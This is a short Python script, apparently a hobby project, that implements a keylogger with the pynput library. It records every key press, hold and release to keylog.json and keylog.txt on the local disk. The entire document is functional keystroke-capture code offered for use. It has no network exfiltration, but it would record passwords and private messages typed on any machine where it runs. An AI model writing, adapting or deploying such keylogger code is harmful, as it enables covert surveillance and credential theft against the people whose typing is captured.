from pynput import keyboard
import json

keylist= []
x = False
key_strokes = ""

def update_text_file(key):          #function to update the text file
    with open("keylog.txt", "w+") as key_stroke:
        key_stroke.write(key)

def update_json_file(keylist):   #function to update the json file
    with open("keylog.json", "wb") as key_log:
        key_list_bytes = json.dumps(keylist).encode()
        key_log.write(key_list_bytes)

def on_press(key):       #function to log key press
    global x , keylist
    if x == False:
        keylist.append({'pressed' : f'{key}'})
        x=True
    if x == True:
        keylist.append({'Held' : f'{key}'})
    update_json_file(keylist)

def on_release(key):         #function to log key release
    global x , keylist , key_strokes 
    keylist.append({'Released' : f'{key}'})
    if x == True:
        x = False
    update_json_file(keylist)

    key_strokes= key_strokes+str(key)
    update_text_file(str(key_strokes))


print(" [+] Running keylogger Successfully \n [!] Saving the keylogs in keylog.json and keylog.txt")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
